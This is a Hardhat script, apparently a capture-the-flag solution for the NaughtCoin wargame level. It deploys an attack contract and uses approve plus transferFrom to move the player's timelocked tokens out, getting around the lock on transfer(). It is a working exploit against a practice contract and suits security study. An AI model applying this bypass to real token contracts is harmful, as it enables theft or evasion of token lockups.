
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let [user] = await ethers.getSigners();
  const Coin = await hre.ethers.getContractFactory("NaughtCoin");
  const coin = await Coin.attach("0x79908e19754348d37518e411f77e70BA1D71deE7");

  console.log("coin deployed to:", coin.address);

  const Attack = await hre.ethers.getContractFactory("AttackNaughtCoin");
  const attack = await Attack.deploy(coin.address);

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  let bal = await coin.balanceOf(user.address);
  console.log(bal)

  const approve = await coin.approve(attack.address, bal);
  const transfer = await attack.transferFrom(bal);

  let bal2 = await coin.balanceOf(user.address);
  console.log(bal2)
  
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
